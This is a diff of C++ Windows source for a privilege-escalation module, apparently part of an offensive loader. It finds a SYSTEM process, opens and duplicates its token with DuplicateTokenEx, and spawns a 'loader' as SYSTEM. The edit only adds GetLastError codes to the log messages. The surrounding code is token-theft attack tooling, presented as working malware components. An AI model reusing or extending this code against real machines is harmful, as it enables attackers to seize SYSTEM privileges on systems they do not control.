@@ -31,7 +31,7 @@ int wmain() {
 		&si,
 		&pi
 	)) {
-		Log("[!] Spawning loader as system failed", "privesc");
+		Log("[!] Spawning loader as system failed" + std::to_string(GetLastError()), "privesc");
 	}
 	else {
 		Log("[+] Successfully spawned loader", "privesc");
@@ -53,7 +53,7 @@ int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
 
 	// ensure handle to target is valid
 	if (hProcess == NULL || hProcess == INVALID_HANDLE_VALUE) {
-		Log("[!] Unable to get handle to target process", "privesc");
+		Log("[!] Unable to get handle to target process: " + std::to_string(GetLastError()), "privesc");
 		return 1; // handle is invalid
 	}
 
@@ -63,7 +63,7 @@ int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
 	HANDLE hProcessToken = NULL;
 	std::unique_ptr<void, decltype(&CloseHandle)> uphProcessToken(static_cast<void*>(hProcessToken), CloseHandle);
 	if (!OpenProcessToken(hProcess, TOKEN_DUPLICATE, &hProcessToken)) {
-		Log("[!] Unable to open target process' token", "privesc");
+		Log("[!] Unable to open target process' token" + std::to_string(GetLastError()), "privesc");
 		return 2;
 	}
 
@@ -72,7 +72,7 @@ int ImpersonateToken(DWORD dwPID, HANDLE* hNewToken) {
 	// duplicate the token
 	DWORD dwDesiredAccess = TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID | TOKEN_QUERY | TOKEN_DUPLICATE | TOKEN_ASSIGN_PRIMARY;
 	if (!DuplicateTokenEx(hProcessToken, dwDesiredAccess, NULL, SecurityDelegation, TokenPrimary, hNewToken)) {
-		Log("[!] Unable to duplicate token", "privesc");
+		Log("[!] Unable to duplicate token" + std::to_string(GetLastError()), "privesc");
 		return 3;
 	}
 
@@ -97,7 +97,7 @@ int SystemToken(HANDLE* hNewToken) {
 	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 1);
 	std::unique_ptr<void, decltype(&CloseHandle)> uphSnapshot(static_cast<void*>(hSnapshot), CloseHandle);
 	if (hSnapshot == INVALID_HANDLE_VALUE || Process32FirstW(hSnapshot, &pe) == false) {
-		Log("[!] Snapshot of processes is invalid or empty", "privesc");
+		Log("[!] Snapshot of processes is invalid or empty" + std::to_string(GetLastError()), "privesc");
 		return 1; // list of processes is invalid or empty
 	}
 
@@ -113,7 +113,7 @@ int SystemToken(HANDLE* hNewToken) {
 	} while (dwTarget == 0 && Process32NextW(hSnapshot, &pe));
 
 	if (dwTarget == 0) {
-		Log("[!] Could not find a process to steal system token from", "privesc");
+		Log("[!] Could not find a process to steal system token from" + std::to_string(GetLastError()), "privesc");
 		return 2; // did not find a process to steal system token from
 	}
 
